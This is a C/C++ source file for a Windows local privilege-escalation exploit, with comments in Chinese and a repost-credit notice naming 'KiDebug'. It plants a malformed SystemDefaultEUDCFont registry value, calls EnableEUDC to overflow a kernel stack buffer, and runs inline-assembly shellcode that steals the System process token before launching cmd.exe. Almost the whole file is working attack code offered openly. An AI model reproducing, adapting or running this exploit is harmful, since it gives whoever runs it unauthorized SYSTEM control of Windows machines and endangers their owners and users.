/*
转载时请注明“KiDebug”。联系方式：KiDebug@163.com
*/
//#include <windows.h>
#include <stdio.h>
#include <afxwin.h>  


extern "C" BOOL WINAPI EnableEUDC(BOOL fEnableEUDC);

void _declspec(naked) ShellCode()
{
	__asm
	{
			mov eax, fs:[34h]
			mov eax,[eax + 78h]
			mov eax,[eax]
			mov eax,[eax+40h];
			mov ebx,fs:[124h]
			mov ebx,[ebx+50h]
			mov [ebx+0f8h],eax
			mov ebp,esp
			add ebp,30h
			mov edi,[ebp+4]
			mov eax,[edi-4]
			add edi,eax
			mov eax,04h
			repnz scasb
			lea edi,[edi+9]
			push edi
			xor eax,eax
			ret
	}
}

//栈空间 8个DWORD，一个ebp，一个返回地址，两个参数，从ebp-0x20+8开始，需要覆盖10个DWORD，共0x28个字节
//之所以要覆盖参数是因为wcsncpy_s 会出错
//之所以注销会蓝屏是因为ebp-4、ebp-c处分配的内存没有被释放
void main()
{
	BYTE	RegBuf[0x28] = {0};
	DWORD	ExpSize = 0x28;
	*(DWORD*)(RegBuf + 0x1C) = (DWORD)ShellCode;

	UINT	codepage = GetACP();
	WCHAR	tmpstr[256];
	swprintf_s(tmpstr, L"EUDC\\%d", codepage);
	HKEY hKey;
	RegCreateKeyEx(HKEY_CURRENT_USER, tmpstr, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE | DELETE, NULL, &hKey, NULL);
	RegDeleteValue(hKey, L"SystemDefaultEUDCFont");

	RegSetValueEx(hKey, L"SystemDefaultEUDCFont", 0, REG_BINARY, RegBuf, ExpSize);
	EnableEUDC(TRUE);

	RegDeleteValue(hKey, L"SystemDefaultEUDCFont");
	RegCloseKey(hKey);

	ShellExecuteA(NULL,   "open",   "cmd.exe ",   NULL,   NULL,   SW_SHOWNORMAL);
}


